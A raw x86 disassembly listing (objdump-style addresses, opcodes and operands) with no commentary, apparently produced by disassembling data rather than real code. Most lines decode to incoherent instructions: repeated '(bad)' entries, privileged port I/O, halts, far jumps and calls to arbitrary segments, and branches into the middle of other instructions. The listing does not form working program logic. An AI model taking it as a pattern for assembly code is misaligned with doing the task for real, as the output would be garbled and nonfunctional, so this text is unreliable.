  41c88d:	cdq    
  41c88e:	gs mov bh,0x0
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	popa   
  41c901:	aaa    
  41c902:	sub    al,BYTE PTR [esp+ecx*2+0x2f]
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	retf   
  41c90d:	jmp    0x2ebe:0x455e89f0
  41c914:	pusha  
  41c915:	out    0xdf,al
  41c917:	mov    bh,0xee
  41c919:	mov    dh,0x66
  41c91b:	iret   
  41c91c:	in     al,dx
  41c91d:	into   
  41c91e:	mov    bl,0xa3
  41c920:	sub    cl,al
  41c922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c923:	jmp    0x632f:0xd1f7a71e
  41c92a:	cmp    eax,0xc4c0c8b8
  41c92f:	imul   ebp,DWORD PTR [ecx-0x41b6aaf4],0x4d
  41c936:	ss add al,0xc4
  41c939:	fistp  WORD PTR fs:[eax+0x1036acd7]
  41c940:	popf   
  41c941:	scas   eax,DWORD PTR es:[edi]
  41c942:	mov    esi,0x84b8b6cc
  41c947:	daa    
  41c948:	jge    0x41c8eb
  41c94a:	xlat   BYTE PTR ds:[ebx]
  41c94b:	icebp  
  41c94c:	daa    
  41c94d:	mov    ecx,0x3a073921
  41c952:	dec    esp
  41c953:	and    eax,0xba9fc0be
  41c958:	xchg   ah,cl
  41c95a:	mov    ?,WORD PTR [esi+0x4a]
  41c95d:	outs   dx,DWORD PTR ds:[esi]
  41c95e:	pop    ecx
  41c95f:	pop    es
  41c960:	rol    DWORD PTR [edx],cl
  41c962:	(bad)  [edi-0x2d]
  41c965:	ss and eax,0xc87a564c
  41c96b:	cmp    BYTE PTR [ebx-0x32],bl
  41c96e:	icebp  
  41c96f:	xchg   edi,eax
  41c970:	les    ebx,FWORD PTR ds:0x48f8b4b7
  41c976:	stos   DWORD PTR es:[edi],eax
  41c977:	js     0x41c9dc
  41c979:	cmp    eax,0x1e8b363b
  41c97e:	jnp    0x41c97c
  41c980:	mov    ebx,0x9bf12212
  41c985:	fucomp st(4)
  41c987:	stc    
  41c988:	adc    al,0xbd
  41c98a:	mov    ecx,0x970c4acf
  41c98f:	inc    ebx
  41c990:	mov    edi,0x7faab63c
  41c995:	test   esp,0x1fdcbc15
  41c99b:	adc    BYTE PTR [ebp-0xb],0x3e
  41c99f:	retf   0x8ee9
  41c9a2:	pushf  
  41c9a3:	ins    DWORD PTR es:[edi],dx
  41c9a4:	dec    edx
  41c9a5:	jecxz  0x41c9d1
  41c9a7:	out    dx,al
  41c9a8:	push   ds
  41c9a9:	jnp    0x41c92c
  41c9ab:	xchg   ebp,eax
  41c9ac:	pop    edx
  41c9ad:	sub    ecx,0x61
  41c9b0:	fsub   DWORD PTR [edx-0x215a0289]
  41c9b6:	dec    eax
  41c9b7:	add    al,cl
  41c9b9:	mov    ah,0xaf
  41c9bb:	rcr    esp,cl
  41c9bd:	inc    esi
  41c9be:	aad    0x40
  41c9c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c1:	into   
  41c9c2:	xor    DWORD PTR [ecx+0x2a17141b],eax
  41c9c8:	lock cmp dl,BYTE PTR [edx+esi*8+0x33]
  41c9cd:	fsubr  st,st(4)
  41c9cf:	(bad)  
  41c9d3:	cmp    bh,dl
  41c9d5:	jmp    0x41c9bb
  41c9d7:	out    0xd5,al
  41c9d9:	retf   
  41c9da:	dec    esp
  41c9db:	xchg   BYTE PTR [eax+0x15],bh
  41c9de:	lock xchg edi,eax
  41c9e0:	popa   
  41c9e1:	add    BYTE PTR [ebx+0x10],0xe9
  41c9e5:	imul   edx,DWORD PTR [ebp-0x1cadab74],0xffffff8e
  41c9ec:	mov    ch,0xb1
  41c9ee:	retf   
  41c9ef:	popf   
  41c9f0:	dec    ebx
  41c9f1:	rol    ebx,1
  41c9f3:	cmp    ecx,edi
  41c9f5:	fidiv  WORD PTR [esi+ebx*8]
  41c9f8:	sbb    al,0xb
  41c9fa:	xchg   edi,eax
  41c9fb:	push   ebx
  41c9fc:	or     al,0xe7
  41c9fe:	stos   BYTE PTR es:[edi],al
  41c9ff:	mov    ds:0x3cc52b52,eax
  41ca04:	mov    al,0x55
  41ca06:	pop    ecx
  41ca07:	or     al,0x82
  41ca09:	inc    edx
  41ca0a:	test   eax,0x9b1a5f44
  41ca0f:	sub    eax,0x0
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	cmp    eax,0x50217981
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	test   eax,0x575c6807
  41ca91:	call   0x9f24:0xd7d285a8
  41ca98:	out    dx,eax
  41ca99:	and    al,0xd
  41ca9b:	out    0xbc,al
  41ca9d:	add    eax,0x465c3a28
  41caa2:	jno    0x41cad2
  41caa4:	sbb    DWORD PTR [ebx-0x14],eax
  41caa7:	xchg   ebp,eax
  41caa8:	inc    edx
  41caa9:	push   esi
  41caaa:	lods   eax,DWORD PTR ds:[esi]
  41caab:	lock in eax,dx
  41caad:	sti    
  41caae:	cli    
  41caaf:	jbe    0x41ca72
  41cab1:	mov    ebp,0x65ad46a6
  41cab6:	dec    edx
  41cab7:	fld1   
  41cab9:	mov    dl,0xa9
  41cabb:	(bad)  [eax-0x58bc9196]
  41cac1:	ja     0x41caad
  41cac3:	je     0x41caf4
  41cac5:	arpl   ax,bp
  41cac7:	mov    al,0x8b
  41cac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caca:	cmp    al,0x7a
  41cacc:	xchg   ecx,eax
  41cacd:	mov    edx,0xadf42ce0
  41cad2:	out    dx,eax
  41cad3:	or     al,0xf7
  41cad5:	fcmovne st,st(2)
  41cad7:	mov    ebp,0x7813fd5f
  41cadc:	daa    
  41cadd:	loope  0x41cac0
  41cadf:	and    BYTE PTR ds:0x65eab7bc,dl
  41cae5:	xchg   esp,eax
  41cae6:	xchg   DWORD PTR [ecx-0x21],eax
  41cae9:	cmc    
  41caea:	xor    eax,DWORD PTR [edi+0x1d]
  41caed:	test   BYTE PTR [esi-0x73dada18],ah
  41caf3:	sbb    DWORD PTR [eax-0x4371e58f],0xffffffcf
  41cafa:	xchg   esp,eax
  41cafb:	ss stos BYTE PTR es:[edi],al
  41cafd:	push   eax
  41cafe:	inc    esp
  41caff:	clc    
  41cb00:	mov    ds:0xc8545abe,al
  41cb05:	cmp    al,0x27
  41cb07:	inc    ebx
  41cb08:	sbb    eax,0xfe45d774
  41cb0d:	or     al,0x56
  41cb0f:	and    DWORD PTR [eax],0xffffffde
  41cb12:	repz pushw cs
  41cb15:	fwait
  41cb16:	add    bh,ch
  41cb18:	js     0x41cb14
  41cb1a:	mov    al,ds:0x58d18007
  41cb1f:	stos   BYTE PTR es:[edi],al
  41cb20:	mov    al,0x70
  41cb22:	xrelease mov DWORD PTR [ebp-0x31],ecx
  41cb26:	fmul   st,st(2)
  41cb28:	rol    DWORD PTR [ecx-0x5d6ed9e5],cl
  41cb2e:	and    DWORD PTR [ebx],0x576063b2
  41cb34:	ret    
  41cb35:	or     eax,0x25c7d04a
  41cb3a:	cmc    
  41cb3b:	xchg   DWORD PTR [ebx-0x9],ecx
  41cb3e:	fnstcw WORD PTR [edi-0x46f06e9f]
  41cb44:	rcl    BYTE PTR [eax+0x2b8368d3],1
  41cb4a:	cli    
  41cb4b:	push   cs
  41cb4c:	mov    ds:0x279251a4,al
  41cb51:	mov    eax,ds:0xa5a965d5
  41cb56:	jnp    0x41cb84
  41cb58:	inc    esp
  41cb59:	imul   ebp,DWORD PTR [ebx],0x9b732587
  41cb5f:	call   0x1179:0xf102ce04
  41cb66:	arpl   bx,di
  41cb68:	nop
  41cb69:	or     ch,BYTE PTR ds:0x75f03aaa
  41cb6f:	or     al,0x45
  41cb71:	push   esi
  41cb72:	xchg   edx,eax
  41cb73:	inc    ecx
  41cb74:	mov    ebp,0xff0912c7
  41cb79:	mov    edx,0x7b998cd1
  41cb7e:	fidivr WORD PTR [ebx]
  41cb80:	test   al,0x10
  41cb82:	nop    edx
  41cb85:	push   esi
  41cb86:	sbb    al,0x8b
  41cb88:	bound  edx,QWORD PTR [edx-0x3d]
  41cb8b:	pop    es
  41cb8c:	push   ebx
  41cb8d:	arpl   WORD PTR [esi+edi*4+0x0],cx
	...
  41cbf1:	add    BYTE PTR [eax],al
  41cbf3:	add    BYTE PTR [ecx],ch
  41cbf5:	(bad)  
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0xbf582f22
  41cc03:	lods   al,BYTE PTR ds:[esi]
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	sub    BYTE PTR [ebx],dh
  41cc0e:	ins    DWORD PTR es:[edi],dx
  41cc0f:	mov    esi,0xf85d6f2b
  41cc14:	test   eax,0x5c3391f2
  41cc19:	jnp    0x41cc98
  41cc1b:	not    DWORD PTR [ebp+0x2ce9a1c1]
  41cc21:	out    0x5,al
  41cc23:	xchg   edi,eax
  41cc24:	jae    0x41cbba
  41cc26:	test   DWORD PTR [eax-0x76e43d43],edx
  41cc2c:	sbb    DWORD PTR [eax-0x3acdf853],ebx
  41cc32:	fbstp  TBYTE PTR [ebp-0x44a284f9]
  41cc38:	fadd   QWORD PTR [eax+0x61]
  41cc3b:	dec    edx
  41cc3c:	(bad)  
  41cc3e:	mov    bl,0xa1
  41cc40:	js     0x41cbda
  41cc42:	aad    0xce
  41cc44:	out    0x40,eax
  41cc46:	jb     0x41cc4f
  41cc48:	es js  0x41cc2a
  41cc4b:	pop    esi
  41cc4c:	retf   0xe9c
  41cc4f:	mov    dh,0xcc
  41cc51:	jbe    0x41cc3b
  41cc53:	loop   0x41cc73
  41cc55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc56:	sub    esi,ecx
  41cc58:	cdq    
  41cc59:	push   0xffffffc1
  41cc5b:	cmp    al,0x43
  41cc5d:	or     BYTE PTR [edx],0xf2
  41cc60:	push   cs
  41cc61:	(bad)  
  41cc62:	(bad)  
  41cc63:	scas   eax,DWORD PTR es:[edi]
  41cc64:	or     BYTE PTR [ecx+0x48aaebff],ch
  41cc6a:	push   ds
  41cc6b:	pusha  
  41cc6c:	xchg   BYTE PTR [eax-0x4e],cl
  41cc6f:	xor    DWORD PTR [edi],ebx
  41cc71:	or     BYTE PTR [ecx-0x3],dh
  41cc74:	push   edx
  41cc75:	int    0x5b
  41cc77:	enter  0x7f30,0xd1
  41cc7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc7c:	ss jne 0x41cc90
  41cc7f:	mov    bl,dl
  41cc81:	xchg   ecx,eax
  41cc82:	aam    0xd8
  41cc84:	aaa    
  41cc85:	pop    edi
  41cc86:	scas   eax,DWORD PTR es:[edi]
  41cc87:	scas   al,BYTE PTR es:[edi]
  41cc88:	adc    eax,DWORD PTR [eax+0x72]
  41cc8b:	loope  0x41cce5
  41cc8d:	test   DWORD PTR [ebx],ebp
  41cc8f:	mov    dl,0x46
  41cc91:	xor    BYTE PTR [esi],ch
  41cc93:	arpl   sp,bp
  41cc95:	cmp    esp,ebp
  41cc97:	pusha  
  41cc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc99:	test   DWORD PTR [esi+0x1f64ef62],edi
  41cc9f:	mov    bh,0x68
  41cca1:	jle    0x41ccd4
  41cca3:	pusha  
  41cca4:	data16 mov al,ds:0x992a72bd
  41ccaa:	ss push 0x7a
  41ccad:	mov    al,ds:0xa173d7cb
  41ccb2:	ret    0xaf07
  41ccb5:	inc    edi
  41ccb6:	add    ebp,edi
  41ccb8:	in     eax,0xa5
  41ccba:	lds    ebp,FWORD PTR [ecx]
  41ccbc:	loope  0x41cd2f
  41ccbe:	and    al,0x3a
  41ccc1:	fnstcw WORD PTR [edi+edx*2+0x38]
  41ccc5:	and    ebx,DWORD PTR [esi+edx*1+0x3e2c2189]
  41cccc:	and    esi,ebx
  41ccce:	pop    ecx
  41cccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccd0:	adc    BYTE PTR [edi-0x7b9cd6b3],cl
  41ccd6:	retf   
  41ccd7:	dec    ebx
  41ccd8:	sub    BYTE PTR [ecx+0x4e],0x25
  41ccdc:	lods   eax,DWORD PTR es:[esi]
  41ccde:	cld    
  41ccdf:	jno    0x41cc98
  41cce1:	imul   ecx,esp,0x2ec259a8
  41cce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cce8:	mov    eax,0x769295b6
  41cced:	pop    esi
  41ccee:	push   edi
  41ccef:	sbb    BYTE PTR [esi-0x66],ch
  41ccf2:	cmp    esi,DWORD PTR [esi]
  41ccf4:	fstp   DWORD PTR [edx]
  41ccf6:	aaa    
  41ccf7:	push   ebp
  41ccf8:	or     esi,DWORD PTR [eax-0x42383c57]
  41ccfe:	pop    ebp
  41ccff:	xor    DWORD PTR [ebx],ebp
  41cd01:	jnp    0x41cd2a
  41cd03:	popa   
  41cd04:	jb     0x41cd6f
  41cd06:	stos   BYTE PTR es:[edi],al
  41cd07:	pop    ss
  41cd08:	lock into 
  41cd0a:	pop    esp
  41cd0b:	cmp    eax,0xd8221621
	...
  41cd74:	pusha  
  41cd75:	cdq    
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	call   FWORD PTR [edi+0x32580713]
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	lea    edi,[edx-0x58511b1]
  41cd92:	adc    edi,DWORD PTR [eax-0x512a417f]
  41cd98:	mov    al,ds:0x788cd2d1
  41cd9d:	addr16 gs inc ebp
  41cda0:	stos   BYTE PTR es:[edi],al
  41cda1:	pushf  
  41cda2:	stos   DWORD PTR es:[edi],eax
  41cda3:	imul   edx,DWORD PTR [ebx+0x5083b8c8],0xe772b308
  41cdad:	lock pop ecx
  41cdaf:	mov    eax,ds:0xd7aad50d
  41cdb4:	(bad)  
  41cdb5:	dec    esi
  41cdb6:	and    BYTE PTR [ecx],ah
  41cdb8:	pop    ss
  41cdb9:	data16 je 0x41cd61
  41cdbc:	(bad)  
  41cdbe:	push   esp
  41cdbf:	leave  
  41cdc0:	and    edx,DWORD PTR [ebp+0x4eb8f7bf]
  41cdc6:	xor    DWORD PTR [edx+0x2],edi
  41cdc9:	dec    eax
  41cdca:	pusha  
  41cdcb:	test   al,0x12
  41cdcd:	mov    edx,0x141c095c
  41cdd2:	rol    BYTE PTR [edi],1
  41cdd4:	in     al,0x89
  41cdd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdd7:	lock and ebp,0xffffffbf
  41cddb:	stc    
  41cddc:	xchg   BYTE PTR [eax],cl
  41cdde:	mov    ds:0x197ac8ab,eax
  41cde3:	imul   ebx,DWORD PTR [eax-0x72b750c1],0x4b
  41cdea:	aam    0x75
  41cdec:	out    0x26,al
  41cdee:	cmc    
  41cdef:	arpl   ax,si
  41cdf1:	lods   eax,DWORD PTR gs:[esi]
  41cdf3:	loopne 0x41ce39
  41cdf5:	or     eax,0xc1cb701d
  41cdfa:	pop    ebp
  41cdfb:	int    0x4
  41cdfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cdfe:	lock push esi
  41ce00:	ja     0x41cdbd
  41ce02:	(bad)  
  41ce03:	out    0xb,al
  41ce05:	dec    edi
  41ce06:	pop    esi
  41ce07:	xchg   esi,eax
  41ce08:	push   esi
  41ce09:	int    0xe3
  41ce0b:	fild   DWORD PTR [ebx+0x1ba329bd]
  41ce11:	jl     0x41ce55
  41ce13:	fld    TBYTE PTR [ecx]
  41ce15:	mov    bl,0x65
  41ce17:	loopne 0x41cdd0
  41ce19:	imul   ebp,esi,0xfd248c06
  41ce1f:	lock and ebx,0x9b63668d
  41ce26:	dec    esi
  41ce27:	inc    esp
  41ce28:	(bad)  
  41ce29:	xor    al,0x44
  41ce2b:	(bad)  [ecx-0x60]
  41ce2e:	mov    bl,0x5c
  41ce30:	call   0x38a:0x48b5dc7b
  41ce37:	test   DWORD PTR [edx],ebp
  41ce39:	ret    
  41ce3a:	xor    ebp,esi
  41ce3c:	jb     0x41cdf1
  41ce3e:	fmul   DWORD PTR [edi+ecx*4-0x22]
  41ce42:	and    al,0xc9
  41ce44:	das    
  41ce45:	call   0x661e:0xb4364453
  41ce4c:	ins    BYTE PTR es:[edi],dx
  41ce4d:	sti    
  41ce4e:	jmp    0xed57:0x67d45732
  41ce55:	call   0x6e49:0xc301d4d4
  41ce5c:	loopne 0x41ce01
  41ce5e:	jns    0x41ce77
  41ce60:	dec    edi
  41ce61:	pop    edx
  41ce62:	mov    eax,ds:0x28785312
  41ce67:	lahf   
  41ce68:	sbb    al,0x99
  41ce6a:	cwde   
  41ce6b:	pop    es
  41ce6c:	pushf  
  41ce6d:	clc    
  41ce6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce6f:	imul   esp,edi,0x7002550
  41ce75:	add    al,0x36
  41ce77:	fucompp 
  41ce79:	vpaddsb ymm4,ymm3,YMMWORD PTR [ecx]
  41ce7d:	xor    BYTE PTR [eax+esi*2+0xa24be53],al
  41ce84:	and    eax,DWORD PTR [eax-0x77c98b4d]
  41ce8a:	cdq    
  41ce8b:	and    al,0x2a
  41ce8d:	call   0x41fe0e
	...
  41cef2:	add    BYTE PTR [eax],al
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	push   es
  41cf01:	mov    cl,0xb9
  41cf03:	bound  ebx,QWORD PTR [ebx+esi*1+0x1]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	jb     0x41ceaa
  41cf0e:	dec    ebx
  41cf0f:	test   BYTE PTR [esi+0x67ffdbc0],dl
  41cf15:	test   al,0x85
  41cf17:	jno    0x41cf8d
  41cf19:	jmp    0x5b15:0x2ee84abb
  41cf20:	sar    BYTE PTR [ebx+0x62cec9b3],1
  41cf26:	xor    DWORD PTR [eax+0x28],0xf9e50450
  41cf2d:	sbb    esp,eax
  41cf2f:	lock aam 0x68
  41cf32:	pop    ebp
  41cf33:	pushf  
  41cf34:	xchg   bx,ax
  41cf36:	pop    esi
  41cf37:	(bad)  
  41cf38:	in     eax,dx
  41cf39:	xchg   esi,eax
  41cf3a:	lea    ebx,[eax+edx*4+0x2360adc7]
  41cf41:	rcr    DWORD PTR es:[bp+di-0x5fb7],cl
  41cf47:	pop    ebp
  41cf48:	popa   
  41cf49:	out    0x35,al
  41cf4b:	(bad)  
  41cf4c:	outs   dx,DWORD PTR ds:[esi]
  41cf4d:	mov    ch,0x3b
  41cf4f:	sbb    BYTE PTR ds:0x356500d7,dh
  41cf55:	mov    ds:0x2caa190e,al
  41cf5a:	mov    bl,0x9d
  41cf5c:	pop    eax
  41cf5d:	ins    BYTE PTR es:[edi],dx
  41cf5e:	mov    ecx,esp
  41cf60:	js     0x41cfdf
  41cf62:	xchg   esi,eax
  41cf63:	and    ah,bh
  41cf65:	push   edx
  41cf66:	clc    
  41cf67:	mov    ds:0x61ee59ca,eax
  41cf6c:	lea    ebx,[edi+ecx*2-0x11ebf8b8]
  41cf73:	xchg   DWORD PTR [edi],ebp
  41cf75:	adc    DWORD PTR [ecx-0x4ec03521],ebx
  41cf7b:	inc    esp
  41cf7c:	sbb    ebx,DWORD PTR [ebp+0x52]
  41cf7f:	cmp    eax,0xe1768f88
  41cf84:	std    
  41cf85:	mov    esp,0x6bb7b020
  41cf8a:	xchg   edx,eax
  41cf8b:	inc    esi
  41cf8c:	mov    ds:0x5d514cfd,ax
  41cf92:	push   esi
  41cf93:	jp     0x41cfb3
  41cf95:	pop    edi
  41cf96:	mov    eax,0x1e739fc0
  41cf9b:	test   al,0x3
  41cf9d:	(bad)  [ecx+0x76]
  41cfa0:	daa    
  41cfa1:	mov    ebx,DWORD PTR [ebp+0x5529b116]
  41cfa7:	in     al,0xfb
  41cfa9:	hlt    
  41cfaa:	(bad)  
  41cfab:	(bad)  
  41cfad:	push   0xffffffdc
  41cfaf:	cmp    DWORD PTR [ecx+0x4a],esp
  41cfb2:	sub    dl,dl
  41cfb4:	pop    ebp
  41cfb5:	in     al,0xc8
  41cfb7:	and    BYTE PTR [esi+0x5a6cf9d1],dh
  41cfbd:	arpl   WORD PTR [edi-0x6933bf37],cx
  41cfc3:	popa   
  41cfc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfc5:	imul   eax,DWORD PTR [edi],0x70
  41cfc8:	xor    dh,BYTE PTR [esi]
  41cfca:	fs scas eax,DWORD PTR es:[edi]
  41cfcc:	add    eax,edx
  41cfce:	add    cl,bh
  41cfd0:	xor    al,0xe4
  41cfd2:	iret   
  41cfd3:	xchg   ebp,eax
  41cfd4:	dec    esi
  41cfd5:	into   
  41cfd6:	nop
  41cfd7:	sahf   
  41cfd8:	outs   dx,DWORD PTR ds:[esi]
  41cfd9:	loope  0x41d04a
  41cfdb:	(bad)  
  41cfdc:	dec    edx
  41cfdd:	aas    
  41cfde:	xchg   ebp,eax
  41cfdf:	cmp    al,0x43
  41cfe1:	hlt    
  41cfe2:	sub    DWORD PTR [ebp-0x272a258],0xd1078fa3
  41cfec:	data16 arpl sp,si
  41cfef:	ret    
  41cff0:	dec    eax
  41cff1:	cdq    
  41cff2:	sahf   
  41cff3:	add    BYTE PTR [esi],bh
  41cff5:	pop    esp
  41cff6:	add    BYTE PTR [esi+eiz*4],ch
  41cff9:	loope  0x41cfb8
  41cffb:	push   esi
  41cffc:	(bad)  
  41cffd:	jmp    0x41d017
  41cfff:	dec    esi
  41d000:	mov    ebp,0x560e5a79
  41d005:	pop    edi
  41d006:	adc    cl,0x31
  41d009:	pushf  
  41d00a:	repnz cli 
  41d00c:	or     bh,BYTE PTR [ecx+0x26]
  41d00f:	test   DWORD PTR [eax],0x0
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0x8a8c3fbd
  41d083:	das    
  41d084:	pusha  
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	test   al,0xcd
  41d08e:	pop    esi
  41d08f:	loop   0x41d011
  41d091:	loop   0x41d01f
  41d093:	dec    ebx
  41d094:	xor    ecx,DWORD PTR [ecx-0x768b35bd]
  41d09a:	fwait
  41d09b:	ss mov esp,0xf682ce7
  41d0a1:	xchg   DWORD PTR [edx-0x3723d1f2],esp
  41d0a7:	in     al,0xe4
  41d0a9:	stos   BYTE PTR es:[edi],al
  41d0aa:	fstp   DWORD PTR [edi-0x52]
  41d0ad:	pushf  
  41d0ae:	inc    edx
  41d0af:	sbb    edx,edi
  41d0b1:	jbe    0x41d034
  41d0b3:	or     dl,ch
  41d0b5:	rcr    DWORD PTR [edx],1
  41d0b7:	add    DWORD PTR [ecx+0x705b5106],0xffffffb3
  41d0be:	adc    bh,dh
  41d0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0c1:	test   BYTE PTR ds:0xc65a149d,ah
  41d0c7:	mov    BYTE PTR [ebp-0x1],dl
  41d0ca:	adc    al,0x87
  41d0cc:	lahf   
  41d0cd:	in     eax,0x68
  41d0cf:	and    DWORD PTR [eax+0x5c],0x10bd828d
  41d0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0d7:	jo     0x41d0e3
  41d0d9:	and    eax,0x2b2dcf8e
  41d0de:	rcl    BYTE PTR [ecx-0xf7751ce],1
  41d0e4:	leave  
  41d0e5:	sbb    ch,BYTE PTR [esi+0x46]
  41d0e8:	xchg   cl,dl
  41d0ea:	imul   esi,DWORD PTR [esp+eiz*8],0xffffffb7
  41d0ee:	shl    DWORD PTR [ebx-0x1ce990f1],0x1f
  41d0f5:	adc    eax,0xcbc21f32
  41d0fa:	push   ecx
  41d0fb:	inc    eax
  41d0fc:	xor    ch,ch
  41d0fe:	test   al,0x7b
  41d100:	xlat   BYTE PTR ds:[ebx]
  41d101:	call   DWORD PTR [edi+eax*2+0x4cac293f]
  41d108:	xor    BYTE PTR [ebx+0x2f],dh
  41d10b:	(bad)  
  41d10c:	fidiv  WORD PTR [esi]
  41d10e:	xchg   ebx,eax
  41d10f:	pop    esp
  41d110:	and    DWORD PTR [edx+0x7c7ee57c],0x6c
  41d117:	xor    eax,0x111897c7
  41d11c:	inc    ecx
  41d11d:	rcr    DWORD PTR [ecx-0x76],1
  41d120:	in     eax,0x95
  41d122:	add    esp,DWORD PTR [ecx+eax*4+0x5f913bda]
  41d129:	jecxz  0x41d0dc
  41d12b:	fstp   QWORD PTR [esi+0x1c]
  41d12e:	stos   BYTE PTR es:[edi],al
  41d12f:	fcmovb st,st(6)
  41d131:	sbb    ch,bh
  41d133:	sbb    dl,bh
  41d135:	jns    0x41d0c1
  41d137:	(bad)  
  41d138:	cmp    DWORD PTR [ebx+0x56b1d22b],eax
  41d13e:	dec    edi
  41d13f:	movq   mm2,mm1
  41d142:	lock push ebp
  41d144:	ret    
  41d145:	pop    ebx
  41d146:	jbe    0x41d115
  41d148:	fist   WORD PTR [ebp-0x429e7139]
  41d14e:	popa   
  41d14f:	retf   
  41d150:	mov    cl,0x3a
  41d152:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d153:	aam    0x42
  41d155:	and    eax,0xd5ed83bd
  41d15a:	pop    esi
  41d15b:	xor    BYTE PTR [ecx],bh
  41d15d:	pop    esp
  41d15e:	fs push esp
  41d160:	mul    BYTE PTR es:[edi-0x3]
  41d164:	mov    BYTE PTR [ecx],cl
  41d166:	or     ah,BYTE PTR [bx-0x18]
  41d16a:	iret   
  41d16b:	xor    al,bl
  41d16d:	inc    ebx
  41d16e:	sub    al,0x5f
  41d170:	jno    0x41d11d
  41d172:	cmp    esp,DWORD PTR [esi+ebp*2]
  41d175:	or     al,BYTE PTR [eax+0x20aa5e2b]
  41d17b:	and    eax,0xf7095dbc
  41d180:	test   al,0xce
  41d182:	inc    ebx
  41d183:	repz scas al,BYTE PTR es:[edi]
  41d185:	push   ds
  41d186:	dec    eax
  41d187:	sahf   
  41d188:	out    0x24,eax
  41d18a:	adc    DWORD PTR [eax],esi
  41d18c:	push   ebx
  41d18d:	bound  esi,QWORD PTR [esi]
  41d18f:	add    DWORD PTR [eax],0x0
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	cmp    al,0x1d
  41d202:	jp     0x41d24c
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	mov    ebx,0xf3f31bfd
  41d211:	(bad)  
  41d212:	jns    0x41d250
  41d214:	ins    BYTE PTR es:[edi],dx
  41d215:	cmp    DWORD PTR [ecx+0x16],ebx
  41d218:	push   eax
  41d219:	pop    esp
  41d21a:	ss add cl,ch
  41d21d:	sub    edx,eax
  41d21f:	fcmovbe st,st(5)
  41d221:	xor    BYTE PTR [edx+0x7b],0xe1
  41d225:	pop    esp
  41d226:	in     al,dx
  41d227:	mov    ebx,0x18546b13
  41d22c:	in     eax,dx
  41d22d:	mov    dh,0xe3
  41d22f:	mov    cl,ah
  41d231:	mov    es,WORD PTR [ecx+0x46]
  41d234:	aaa    
  41d235:	in     eax,0xa1
  41d237:	xor    eax,0x6bf42083
  41d23c:	cmp    ebp,DWORD PTR [ecx-0x428d334d]
  41d242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d243:	jmp    0x41d23b
  41d245:	and    edx,DWORD PTR [ebx+0x5e]
  41d248:	mov    ds:0x80ea2623,al
  41d24d:	iret   
  41d24e:	mov    dh,0xd1
  41d250:	push   edi
  41d251:	and    cl,BYTE PTR [ecx+ebp*8-0x4da584cb]
  41d258:	aas    
  41d259:	ins    DWORD PTR es:[edi],dx
  41d25a:	std    
  41d25b:	test   al,0x22
  41d25d:	adc    cl,ch
  41d25f:	fistp  QWORD PTR ds:0xaeb119f0
  41d265:	hlt    
  41d266:	sub    eax,0xe847413d
  41d26b:	mov    ah,0x86
  41d26d:	outs   dx,BYTE PTR ds:[esi]
  41d26e:	in     eax,dx
  41d26f:	push   0x10e120d1
  41d274:	rcr    DWORD PTR [ebp+edi*4-0x51],1
  41d278:	dec    ebp
